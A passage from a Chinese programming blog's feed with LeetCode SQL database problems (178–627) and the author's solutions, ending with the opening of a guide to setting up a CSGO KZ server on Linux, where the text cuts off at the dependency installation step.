查询来实现分数排名。如果两个分数相同，则两个分数排名（Rank）相同。请注意，平分后的下一个名次应该是下一个连续的整数值。换句话说，名次之间不应该有“间隔”。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+----+-------+</span><br><span class="line">| Id | Score |</span><br><span class="line">+----+-------+</span><br><span class="line">| 1  | 3.50  |</span><br><span class="line">| 2  | 3.65  |</span><br><span class="line">| 3  | 4.00  |</span><br><span class="line">| 4  | 3.85  |</span><br><span class="line">| 5  | 4.00  |</span><br><span class="line">| 6  | 3.65  |</span><br><span class="line">+----+-------+</span><br></pre></td></tr></table></figure><p>例如，根据上述给定的 <code>Scores</code> 表，你的查询应该返回（按分数从高到低排列）：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+-------+------+</span><br><span class="line">| Score | Rank |</span><br><span class="line">+-------+------+</span><br><span class="line">| 4.00  | 1    |</span><br><span class="line">| 4.00  | 1    |</span><br><span class="line">| 3.85  | 2    |</span><br><span class="line">| 3.65  | 3    |</span><br><span class="line">| 3.65  | 3    |</span><br><span class="line">| 3.50  | 4    |</span><br><span class="line">+-------+------+</span><br></pre></td></tr></table></figure><h2 id="题解-4"><a class="markdownIt-Anchor" href="#题解-4"></a> 题解</h2><p>先把人按成绩排个序，然后顺次select并保存上一次的分数，如果分数一样则给一样的排名，不一样了排名就+1。<br />pre_score要初始化为null，我一开始初始化成0结果雪崩，测试样例里面有成绩为0的23333333</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> Score,<span class="keyword">cast</span>(<span class="keyword">Rank</span> <span class="keyword">as</span> signed) <span class="keyword">as</span> <span class="keyword">Rank</span> <span class="keyword">from</span>(</span><br><span class="line"><span class="keyword">select</span> tmp.score <span class="keyword">as</span> Score,@k:=(<span class="keyword">case</span> <span class="keyword">when</span> @pre_score=tmp.score <span class="keyword">then</span> @k <span class="keyword">else</span> @k:=@k+<span class="number">1</span> <span class="keyword">end</span>) <span class="keyword">as</span> <span class="keyword">Rank</span>,@pre_score:=tmp.score <span class="keyword">as</span> pre_score</span><br><span class="line"><span class="keyword">from</span> </span><br><span class="line">(<span class="keyword">select</span> * <span class="keyword">from</span> Scores <span class="keyword">order</span> <span class="keyword">by</span> Score <span class="keyword">desc</span>) tmp,(<span class="keyword">select</span> @k :=<span class="number">0</span>, @pre_score:=<span class="literal">null</span>) initialise</span><br><span class="line">) temp</span><br></pre></td></tr></table></figure><h1 id="180-连续出现的数字"><a class="markdownIt-Anchor" href="#180-连续出现的数字"></a> 180. 连续出现的数字</h1><h2 id="题目-5"><a class="markdownIt-Anchor" href="#题目-5"></a> 题目</h2><p>编写一个 SQL 查询，查找所有至少连续出现三次的数字。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+----+-----+</span><br><span class="line">| Id | Num |</span><br><span class="line">+----+-----+</span><br><span class="line">| 1  |  1  |</span><br><span class="line">| 2  |  1  |</span><br><span class="line">| 3  |  1  |</span><br><span class="line">| 4  |  2  |</span><br><span class="line">| 5  |  1  |</span><br><span class="line">| 6  |  2  |</span><br><span class="line">| 7  |  2  |</span><br><span class="line">+----+-----+</span><br></pre></td></tr></table></figure><p>例如，给定上面的 Logs 表， 1 是唯一连续出现至少三次的数字。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+-----------------+</span><br><span class="line">| ConsecutiveNums |</span><br><span class="line">+-----------------+</span><br><span class="line">| 1               |</span><br><span class="line">+-----------------+</span><br></pre></td></tr></table></figure><h2 id="题解-5"><a class="markdownIt-Anchor" href="#题解-5"></a> 题解</h2><p>和178类似，只不过这次我们不排序了，直接select，然后通过维护一个times列来标记出现的次数，和上一次相同就+1，不同就回到1。<br />最后统计times列大于2的数，再去个重就可以了。</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">distinct</span> <span class="keyword">Num</span> <span class="keyword">as</span> ConsecutiveNums <span class="keyword">from</span> (</span><br><span class="line"><span class="keyword">select</span> tmp.ID,tmp.Num,@k:=(<span class="keyword">case</span> <span class="keyword">when</span> @pre_num=tmp.num <span class="keyword">then</span> @k:=@k+<span class="number">1</span> <span class="keyword">else</span> @k:=<span class="number">1</span> <span class="keyword">end</span>) <span class="keyword">as</span> Times,@pre_num:=tmp.num <span class="keyword">as</span> pre_num</span><br><span class="line"><span class="keyword">from</span> </span><br><span class="line">(<span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">Logs</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="keyword">Id</span>) tmp,(<span class="keyword">select</span> @k :=<span class="number">1</span>, @pre_num:=<span class="literal">null</span>) initialise</span><br><span class="line">) tmp <span class="keyword">where</span> Times&gt;<span class="number">2</span></span><br></pre></td></tr></table></figure><h1 id="181-超过经理收入的员工"><a class="markdownIt-Anchor" href="#181-超过经理收入的员工"></a> 181. 超过经理收入的员工</h1><h2 id="题目-6"><a class="markdownIt-Anchor" href="#题目-6"></a> 题目</h2><p><code>Employee</code> 表包含所有员工，他们的经理也属于员工。每个员工都有一个 Id，此外还有一列对应员工的经理的 Id。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+----+-------+--------+-----------+</span><br><span class="line">| Id | Name  | Salary | ManagerId |</span><br><span class="line">+----+-------+--------+-----------+</span><br><span class="line">| 1  | Joe   | 70000  | 3         |</span><br><span class="line">| 2  | Henry | 80000  | 4         |</span><br><span class="line">| 3  | Sam   | 60000  | NULL      |</span><br><span class="line">| 4  | Max   | 90000  | NULL      |</span><br><span class="line">+----+-------+--------+-----------+</span><br></pre></td></tr></table></figure><p>给定 <code>Employee</code> 表，编写一个 SQL 查询，该查询可以获取收入超过他们经理的员工的姓名。在上面的表格中，Joe 是唯一一个收入超过他的经理的员工。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+----------+</span><br><span class="line">| Employee |</span><br><span class="line">+----------+</span><br><span class="line">| Joe      |</span><br><span class="line">+----------+</span><br></pre></td></tr></table></figure><h2 id="题解-6"><a class="markdownIt-Anchor" href="#题解-6"></a> 题解</h2><p>把Employee表查询两次互相对比，把ID和managerID对应之后比较salary即可</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> A.name <span class="keyword">as</span> Employee <span class="keyword">FROM</span> employee <span class="keyword">as</span> A,employee <span class="keyword">as</span> B <span class="keyword">where</span> A.ManagerID=B.Id <span class="keyword">and</span> A.Salary&gt;B.Salary</span><br></pre></td></tr></table></figure><h1 id="182-查找重复的电子邮箱"><a class="markdownIt-Anchor" href="#182-查找重复的电子邮箱"></a> 182. 查找重复的电子邮箱</h1><h2 id="题目-7"><a class="markdownIt-Anchor" href="#题目-7"></a> 题目</h2><p>编写一个 SQL 查询，查找 <code>Person</code> 表中所有重复的电子邮箱。</p><p>示例：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+----+---------+</span><br><span class="line">| Id | Email   |</span><br><span class="line">+----+---------+</span><br><span class="line">| 1  | a@b.com |</span><br><span class="line">| 2  | c@d.com |</span><br><span class="line">| 3  | a@b.com |</span><br><span class="line">+----+---------+</span><br></pre></td></tr></table></figure><p>根据以上输入，你的查询应返回以下结果：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+---------+</span><br><span class="line">| Email   |</span><br><span class="line">+---------+</span><br><span class="line">| a@b.com |</span><br><span class="line">+---------+</span><br></pre></td></tr></table></figure><p>说明：所有电子邮箱都是小写字母。</p><h2 id="题解-7"><a class="markdownIt-Anchor" href="#题解-7"></a> 题解</h2><p>按Email进行GroupBy，然后统计数量&gt;1的</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Email <span class="keyword">FROM</span> (<span class="keyword">select</span> <span class="keyword">count</span>(*) <span class="keyword">as</span> count2,Email <span class="keyword">from</span> Person <span class="keyword">group</span> <span class="keyword">by</span> Email) a <span class="keyword">where</span> count2&gt;<span class="number">1</span></span><br></pre></td></tr></table></figure><h1 id="183-从不订购的客户"><a class="markdownIt-Anchor" href="#183-从不订购的客户"></a> 183. 从不订购的客户</h1><h2 id="题目-8"><a class="markdownIt-Anchor" href="#题目-8"></a> 题目</h2><p>某网站包含两个表，<code>Customers</code> 表和 <code>Orders</code> 表。编写一个 SQL 查询，找出所有从不订购任何东西的客户。</p><p><code>Customers</code> 表：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+----+-------+</span><br><span class="line">| Id | Name  |</span><br><span class="line">+----+-------+</span><br><span class="line">| 1  | Joe   |</span><br><span class="line">| 2  | Henry |</span><br><span class="line">| 3  | Sam   |</span><br><span class="line">| 4  | Max   |</span><br><span class="line">+----+-------+</span><br></pre></td></tr></table></figure><p><code>Orders</code> 表：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+----+------------+</span><br><span class="line">| Id | CustomerId |</span><br><span class="line">+----+------------+</span><br><span class="line">| 1  | 3          |</span><br><span class="line">| 2  | 1          |</span><br><span class="line">+----+------------+</span><br></pre></td></tr></table></figure><p>例如给定上述表格，你的查询应返回：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+-----------+</span><br><span class="line">| Customers |</span><br><span class="line">+-----------+</span><br><span class="line">| Henry     |</span><br><span class="line">| Max       |</span><br><span class="line">+-----------+</span><br></pre></td></tr></table></figure><h2 id="题解-8"><a class="markdownIt-Anchor" href="#题解-8"></a> 题解</h2><p>直接NOT IN</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">name</span> <span class="keyword">as</span> Customers <span class="keyword">from</span> Customers <span class="keyword">where</span> Customers.id <span class="keyword">NOT</span> <span class="keyword">IN</span>(<span class="keyword">select</span> CustomerId <span class="keyword">from</span> Orders)</span><br></pre></td></tr></table></figure><h1 id="184-部门工资最高的员工"><a class="markdownIt-Anchor" href="#184-部门工资最高的员工"></a> 184. 部门工资最高的员工</h1><h2 id="题目-9"><a class="markdownIt-Anchor" href="#题目-9"></a> 题目</h2><p><code>Employee</code> 表包含所有员工信息，每个员工有其对应的 Id, salary 和 department Id。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+----+-------+--------+--------------+</span><br><span class="line">| Id | Name  | Salary | DepartmentId |</span><br><span class="line">+----+-------+--------+--------------+</span><br><span class="line">| 1  | Joe   | 70000  | 1            |</span><br><span class="line">| 2  | Henry | 80000  | 2            |</span><br><span class="line">| 3  | Sam   | 60000  | 2            |</span><br><span class="line">| 4  | Max   | 90000  | 1            |</span><br><span class="line">+----+-------+--------+--------------+</span><br></pre></td></tr></table></figure><p><code>Department</code>表包含公司所有部门的信息。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+----+----------+</span><br><span class="line">| Id | Name     |</span><br><span class="line">+----+----------+</span><br><span class="line">| 1  | IT       |</span><br><span class="line">| 2  | Sales    |</span><br><span class="line">+----+----------+</span><br></pre></td></tr></table></figure><p>编写一个 SQL 查询，找出每个部门工资最高的员工。例如，根据上述给定的表格，Max 在 IT 部门有最高工资，Henry 在 Sales 部门有最高工资。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+------------+----------+--------+</span><br><span class="line">| Department | Employee | Salary |</span><br><span class="line">+------------+----------+--------+</span><br><span class="line">| IT         | Max      | 90000  |</span><br><span class="line">| Sales      | Henry    | 80000  |</span><br><span class="line">+------------+----------+--------+</span><br></pre></td></tr></table></figure><h2 id="题解-9"><a class="markdownIt-Anchor" href="#题解-9"></a> 题解</h2><p>GroupBy部门之后获取Max Salary和对应的DepartmentID，然后查表获取ID相同薪水相同的兄弟，再加上其他信息就可以了。</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> department.name <span class="keyword">as</span> Department,B.Name <span class="keyword">as</span> Employee,B.Salary <span class="keyword">from</span>(<span class="keyword">SELECT</span> DepartmentId,<span class="keyword">Max</span>(salary) <span class="keyword">as</span> salary <span class="keyword">FROM</span> employee <span class="keyword">group</span> <span class="keyword">by</span> DepartmentId) A,employee B,Department <span class="keyword">where</span> A.DepartmentId=B.DepartmentId <span class="keyword">and</span> A.Salary=B.salary <span class="keyword">and</span> B.DepartmentId=Department.Id</span><br></pre></td></tr></table></figure><h1 id="196-删除重复的电子邮箱"><a class="markdownIt-Anchor" href="#196-删除重复的电子邮箱"></a> 196. 删除重复的电子邮箱</h1><h2 id="题目-10"><a class="markdownIt-Anchor" href="#题目-10"></a> 题目</h2><p>编写一个 SQL 查询，来删除 <code>Person</code> 表中所有重复的电子邮箱，重复的邮箱里只保留 Id 最小 的那个。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+----+------------------+</span><br><span class="line">| Id | Email            |</span><br><span class="line">+----+------------------+</span><br><span class="line">| 1  | john@example.com |</span><br><span class="line">| 2  | bob@example.com  |</span><br><span class="line">| 3  | john@example.com |</span><br><span class="line">+----+------------------+</span><br><span class="line">Id 是这个表的主键。</span><br></pre></td></tr></table></figure><p>例如，在运行你的查询语句之后，上面的 <code>Person</code> 表应返回以下几行:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+----+------------------+</span><br><span class="line">| Id | Email            |</span><br><span class="line">+----+------------------+</span><br><span class="line">| 1  | john@example.com |</span><br><span class="line">| 2  | bob@example.com  |</span><br><span class="line">+----+------------------+</span><br></pre></td></tr></table></figure><h2 id="题解-10"><a class="markdownIt-Anchor" href="#题解-10"></a> 题解</h2><p>先把email groupby来获得重复数量和最小ID，然后找数量大于1并且Not IN最小ID列表的全部删除</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> person <span class="keyword">where</span></span><br><span class="line">Email <span class="keyword">in</span> (<span class="keyword">select</span> <span class="keyword">distinct</span> Email <span class="keyword">from</span> ( <span class="keyword">select</span> Email <span class="keyword">from</span> person <span class="keyword">group</span> <span class="keyword">by</span> Email <span class="keyword">having</span> <span class="keyword">count</span>(Email)&gt;<span class="number">1</span>) a)</span><br><span class="line"><span class="keyword">and</span> <span class="keyword">Id</span> <span class="keyword">not</span> <span class="keyword">in</span> ( <span class="keyword">select</span> <span class="keyword">Id</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">min</span>(<span class="keyword">Id</span>) <span class="keyword">as</span> <span class="keyword">Id</span> <span class="keyword">from</span> person <span class="keyword">group</span> <span class="keyword">by</span> Email <span class="keyword">having</span> <span class="keyword">count</span>(Email)&gt;<span class="number">1</span> ) b) </span><br></pre></td></tr></table></figure><h1 id="197-上升的温度"><a class="markdownIt-Anchor" href="#197-上升的温度"></a> 197. 上升的温度</h1><h2 id="题目-11"><a class="markdownIt-Anchor" href="#题目-11"></a> 题目</h2><p>给定一个 <code>Weather</code> 表，编写一个 SQL 查询，来查找与之前（昨天的）日期相比温度更高的所有日期的 Id。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+---------+------------------+------------------+</span><br><span class="line">| Id(INT) | RecordDate(DATE) | Temperature(INT) |</span><br><span class="line">+---------+------------------+------------------+</span><br><span class="line">|       1 |       2015-01-01 |               10 |</span><br><span class="line">|       2 |       2015-01-02 |               25 |</span><br><span class="line">|       3 |       2015-01-03 |               20 |</span><br><span class="line">|       4 |       2015-01-04 |               30 |</span><br><span class="line">+---------+------------------+------------------+</span><br></pre></td></tr></table></figure><p>例如，根据上述给定的 <code>Weather</code> 表格，返回如下 Id:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+----+</span><br><span class="line">| Id |</span><br><span class="line">+----+</span><br><span class="line">|  2 |</span><br><span class="line">|  4 |</span><br><span class="line">+----+</span><br></pre></td></tr></table></figure><h2 id="题解-11"><a class="markdownIt-Anchor" href="#题解-11"></a> 题解</h2><p>把<code>Weather</code>表并表查询，挑选温度较大并且日期晚一天的记录，用<code>DATEDIFF</code>控制日期差距</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> w1.ID <span class="keyword">from</span> Weather w1,Weather w2</span><br><span class="line"><span class="keyword">where</span> w1.Temperature&gt;w2.Temperature <span class="keyword">and</span> <span class="keyword">DATEDIFF</span>(w1.RecordDate,w2.RecordDate)=<span class="number">1</span></span><br></pre></td></tr></table></figure><h1 id="595-大的国家"><a class="markdownIt-Anchor" href="#595-大的国家"></a> 595. 大的国家</h1><h2 id="题目-12"><a class="markdownIt-Anchor" href="#题目-12"></a> 题目</h2><p>这里有张<code>World</code>表</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+-----------------+------------+------------+--------------+---------------+</span><br><span class="line">| name            | continent  | area       | population   | gdp           |</span><br><span class="line">+-----------------+------------+------------+--------------+---------------+</span><br><span class="line">| Afghanistan     | Asia       | 652230     | 25500100     | 20343000      |</span><br><span class="line">| Albania         | Europe     | 28748      | 2831741      | 12960000      |</span><br><span class="line">| Algeria         | Africa     | 2381741    | 37100000     | 188681000     |</span><br><span class="line">| Andorra         | Europe     | 468        | 78115        | 3712000       |</span><br><span class="line">| Angola          | Africa     | 1246700    | 20609294     | 100990000     |</span><br><span class="line">+-----------------+------------+------------+--------------+---------------+</span><br></pre></td></tr></table></figure><p>如果一个国家的面积超过300万平方公里，或者人口超过2500万，那么这个国家就是大国家。</p><p>编写一个SQL查询，输出表中所有大国家的名称、人口和地区。</p><p>例如，根据上表，我们应该输出:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+--------------+-------------+--------------+</span><br><span class="line">| name         | population  | area         |</span><br><span class="line">+--------------+-------------+--------------+</span><br><span class="line">| Afghanistan  | 25500100    | 652230       |</span><br><span class="line">| Algeria      | 37100000    | 2381741      |</span><br><span class="line">+--------------+-------------+--------------+</span><br></pre></td></tr></table></figure><h2 id="题解-12"><a class="markdownIt-Anchor" href="#题解-12"></a> 题解</h2><p>简单查询</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">name</span>,population,area <span class="keyword">from</span> world <span class="keyword">where</span> area&gt;<span class="number">3000000</span> <span class="keyword">or</span> population&gt;<span class="number">25000000</span></span><br></pre></td></tr></table></figure><h1 id="596-超过5名学生的课"><a class="markdownIt-Anchor" href="#596-超过5名学生的课"></a> 596. 超过5名学生的课</h1><h2 id="题目-13"><a class="markdownIt-Anchor" href="#题目-13"></a> 题目</h2><p>有一个<code>courses</code>表 ，有: student (学生) 和 class (课程)。</p><p>请列出所有超过或等于5名学生的课。</p><p>例如,表:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+---------+------------+</span><br><span class="line">| student | class      |</span><br><span class="line">+---------+------------+</span><br><span class="line">| A       | Math       |</span><br><span class="line">| B       | English    |</span><br><span class="line">| C       | Math       |</span><br><span class="line">| D       | Biology    |</span><br><span class="line">| E       | Math       |</span><br><span class="line">| F       | Computer   |</span><br><span class="line">| G       | Math       |</span><br><span class="line">| H       | Math       |</span><br><span class="line">| I       | Math       |</span><br><span class="line">+---------+------------+</span><br></pre></td></tr></table></figure><p>应该输出:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+---------+</span><br><span class="line">| class   |</span><br><span class="line">+---------+</span><br><span class="line">| Math    |</span><br><span class="line">+---------+</span><br></pre></td></tr></table></figure><p>Note:<br />学生在每个课中不应被重复计算。</p><h2 id="题解-13"><a class="markdownIt-Anchor" href="#题解-13"></a> 题解</h2><p>先从课程中去重(<code>DISTINCT</code>),然后按照课程GroupBy并计数，取大于5的</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">class</span> <span class="keyword">FROM</span> (<span class="keyword">select</span> <span class="keyword">count</span>(*) <span class="keyword">as</span> count2,<span class="keyword">class</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">distinct</span> student,<span class="keyword">class</span> <span class="keyword">from</span> courses) b <span class="keyword">group</span> <span class="keyword">by</span> <span class="keyword">class</span>) a <span class="keyword">where</span> count2&gt;=<span class="number">5</span></span><br></pre></td></tr></table></figure><h1 id="620-有趣的电影"><a class="markdownIt-Anchor" href="#620-有趣的电影"></a> 620. 有趣的电影</h1><h2 id="题目-14"><a class="markdownIt-Anchor" href="#题目-14"></a> 题目</h2><p>某城市开了一家新的电影院，吸引了很多人过来看电影。该电影院特别注意用户体验，专门有个 LED显示板做电影推荐，上面公布着影评和相关电影描述。</p><p>作为该电影院的信息部主管，您需要编写一个 SQL查询，找出所有影片描述为非 boring (不无聊) 的并且 id 为奇数 的影片，结果请按等级 <code>rating</code> 排列。</p><p>例如，下表 <code>cinema</code>:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+---------+-----------+--------------+-----------+</span><br><span class="line">|   id    | movie     |  description |  rating   |</span><br><span class="line">+---------+-----------+--------------+-----------+</span><br><span class="line">|   1     | War       |   great 3D   |   8.9     |</span><br><span class="line">|   2     | Science   |   fiction    |   8.5     |</span><br><span class="line">|   3     | irish     |   boring     |   6.2     |</span><br><span class="line">|   4     | Ice song  |   Fantacy    |   8.6     |</span><br><span class="line">|   5     | House card|   Interesting|   9.1     |</span><br><span class="line">+---------+-----------+--------------+-----------+</span><br></pre></td></tr></table></figure><p>对于上面的例子，则正确的输出是为：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+---------+-----------+--------------+-----------+</span><br><span class="line">|   id    | movie     |  description |  rating   |</span><br><span class="line">+---------+-----------+--------------+-----------+</span><br><span class="line">|   5     | House card|   Interesting|   9.1     |</span><br><span class="line">|   1     | War       |   great 3D   |   8.9     |</span><br><span class="line">+---------+-----------+--------------+-----------+</span><br></pre></td></tr></table></figure><h2 id="题解-14"><a class="markdownIt-Anchor" href="#题解-14"></a> 题解</h2><p>选取不为“boring”且id为奇数的记录，按<code>DESC</code>排序。</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> cinema <span class="keyword">where</span> description&lt;&gt;<span class="string">&#x27;boring&#x27;</span> <span class="keyword">and</span> <span class="keyword">id</span>%<span class="number">2</span>=<span class="number">1</span> <span class="keyword">order</span> <span class="keyword">by</span> rating <span class="keyword">DESC</span></span><br></pre></td></tr></table></figure><h1 id="626-换座位"><a class="markdownIt-Anchor" href="#626-换座位"></a> 626. 换座位</h1><h2 id="题目-15"><a class="markdownIt-Anchor" href="#题目-15"></a> 题目</h2><p>小美是一所中学的信息科技老师，她有一张 <code>seat</code> 座位表，平时用来储存学生名字和与他们相对应的座位 id。</p><p>其中纵列的 id 是连续递增的</p><p>小美想改变相邻俩学生的座位。</p><p>你能不能帮她写一个 SQL query 来输出小美想要的结果呢？</p><p>示例：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+---------+---------+</span><br><span class="line">|    id   | student |</span><br><span class="line">+---------+---------+</span><br><span class="line">|    1    | Abbot   |</span><br><span class="line">|    2    | Doris   |</span><br><span class="line">|    3    | Emerson |</span><br><span class="line">|    4    | Green   |</span><br><span class="line">|    5    | Jeames  |</span><br><span class="line">+---------+---------+</span><br></pre></td></tr></table></figure><p>假如数据输入的是上表，则输出结果如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+---------+---------+</span><br><span class="line">|    id   | student |</span><br><span class="line">+---------+---------+</span><br><span class="line">|    1    | Doris   |</span><br><span class="line">|    2    | Abbot   |</span><br><span class="line">|    3    | Green   |</span><br><span class="line">|    4    | Emerson |</span><br><span class="line">|    5    | Jeames  |</span><br><span class="line">+---------+---------+</span><br></pre></td></tr></table></figure><p>注意：</p><p>如果学生人数是奇数，则不需要改变最后一个同学的座位。</p><h2 id="题解-15"><a class="markdownIt-Anchor" href="#题解-15"></a> 题解</h2><p>我一开始写了个update，然后没输出，update之后select，直接报错，这玩意只能一句query来实现。</p><p>三步走，奇数换偶数名字，偶数换奇数名字，多一个的话直接输出，最后排个序即可。</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> </span><br><span class="line">(</span><br><span class="line"><span class="keyword">select</span> A.id,B.student <span class="keyword">from</span> seat <span class="keyword">as</span> A,seat <span class="keyword">as</span> B <span class="keyword">where</span> B.id%<span class="number">2</span>=<span class="number">0</span> <span class="keyword">and</span> A.id=B.id<span class="number">-1</span> <span class="keyword">and</span> B.id&gt;<span class="number">1</span></span><br><span class="line"><span class="keyword">union</span></span><br><span class="line"><span class="keyword">select</span> B.id,A.student <span class="keyword">from</span> seat <span class="keyword">as</span> A,seat <span class="keyword">as</span> B <span class="keyword">where</span> B.id%<span class="number">2</span>=<span class="number">0</span> <span class="keyword">and</span> A.id=B.id<span class="number">-1</span> <span class="keyword">and</span> B.id&gt;<span class="number">1</span></span><br><span class="line"><span class="keyword">union</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">id</span>,student <span class="keyword">from</span> seat <span class="keyword">where</span> <span class="keyword">id</span>%<span class="number">2</span>=<span class="number">1</span> <span class="keyword">and</span> <span class="keyword">id</span>=(<span class="keyword">select</span> <span class="keyword">max</span>(<span class="keyword">id</span>) <span class="keyword">from</span> seat)</span><br><span class="line">) b <span class="keyword">order</span> <span class="keyword">by</span> <span class="keyword">id</span></span><br></pre></td></tr></table></figure><h1 id="627-交换工资"><a class="markdownIt-Anchor" href="#627-交换工资"></a> 627. 交换工资</h1><h2 id="题目-16"><a class="markdownIt-Anchor" href="#题目-16"></a> 题目</h2><p>给定一个<code>salary</code>表，如下所示，有m=男性 和 f=女性的值 。交换所有的 f 和 m 值(例如，将所有 f 值更改为 m，反之亦然)。要求使用一个更新查询，并且没有中间临时表。</p><p>例如:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">| id | name | sex | salary |</span><br><span class="line">|----|------|-----|--------|</span><br><span class="line">| 1  | A    | m   | 2500   |</span><br><span class="line">| 2  | B    | f   | 1500   |</span><br><span class="line">| 3  | C    | m   | 5500   |</span><br><span class="line">| 4  | D    | f   | 500    |</span><br></pre></td></tr></table></figure><p>运行你所编写的查询语句之后，将会得到以下表:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">| id | name | sex | salary |</span><br><span class="line">|----|------|-----|--------|</span><br><span class="line">| 1  | A    | f   | 2500   |</span><br><span class="line">| 2  | B    | m   | 1500   |</span><br><span class="line">| 3  | C    | f   | 5500   |</span><br><span class="line">| 4  | D    | m   | 500    |</span><br></pre></td></tr></table></figure><h2 id="题解-16"><a class="markdownIt-Anchor" href="#题解-16"></a> 题解</h2><p>更新数据库，条件更新，m赋值f，f赋值m</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">update</span> salary <span class="keyword">set</span> sex=<span class="keyword">case</span> <span class="keyword">when</span> sex=<span class="string">&#x27;f&#x27;</span> <span class="keyword">then</span> <span class="string">&#x27;m&#x27;</span> <span class="keyword">else</span> <span class="string">&#x27;f&#x27;</span> <span class="keyword">end</span></span><br></pre></td></tr></table></figure><h1 id=""><a class="markdownIt-Anchor" href="#"></a> </h1><h2 id="题目-17"><a class="markdownIt-Anchor" href="#题目-17"></a> 题目</h2><h2 id="题解-17"><a class="markdownIt-Anchor" href="#题解-17"></a> 题解</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;175-组合两个表&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#175-组合两个表&quot;&gt;&lt;/a&gt; 175. 组合两个表&lt;/h1&gt;
&lt;h2 id=&quot;题目&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#题目&quot;&gt;&lt;</summary>
      
    
    
    
    <category term="算法" scheme="https://coder.lufer.cc/categories/%E7%AE%97%E6%B3%95/"/>
    
    
    <category term="LeetCode" scheme="https://coder.lufer.cc/tags/LeetCode/"/>
    
  </entry>
  
  <entry>
    <title>Linux下CSGO KZ服务器手动架设指南</title>
    <link href="https://coder.lufer.cc/Linux/Linux%E4%B8%8BCSGOKZ%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%89%8B%E5%8A%A8%E6%9E%B6%E8%AE%BE%E6%8C%87%E5%8D%97/"/>
    <id>https://coder.lufer.cc/Linux/Linux%E4%B8%8BCSGOKZ%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%89%8B%E5%8A%A8%E6%9E%B6%E8%AE%BE%E6%8C%87%E5%8D%97/</id>
    <published>2018-06-18T05:58:40.000Z</published>
    <updated>2021-04-06T02:18:28.783Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a class="markdownIt-Anchor" href="#前言"></a> 前言</h1><p>  最近想搭CSGO KZ服务器，却发现以前的一件安装脚本已经无法下载了，而网上很少能看见Linux版本的KZ服务器假设教程，参考Steam社区文档，进行了一波尝试。</p><blockquote><p><a href="https://steamcommunity.com/sharedfiles/filedetails/?id=855147229">https://steamcommunity.com/sharedfiles/filedetails/?id=855147229</a></p></blockquote><h1 id="前期准备"><a class="markdownIt-Anchor" href="#前期准备"></a> 前期准备</h1><p>  购买服务器，选择远程工具和FTP工具。</p><h1 id="安装依赖"><a class="markdownIt-Anchor" href="#安装依赖"></a> 安装依赖</h1><h2 id="ubuntu"><a class="markdownIt-Anchor" href="#ubuntu"></a> Ubuntu</h2><h3 id="ubuntu-64-bit"><a class="markdownIt-Anchor" href="#ubuntu-64-bit"></a> Ubuntu 64-bit</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo dpkg --add-architecture i386; sudo apt update; sudo apt install mailutils postfix curl wget file bzip2 gzip unzip bsdmainutils python util-linux ca-certificates binutils bc tmux lib32gcc1 libstdc++6 libstdc++6:i386</span><br></pre></td></tr></table></figure><h3 id="ubuntu-32-bit"><a class="markdownIt-Anchor" 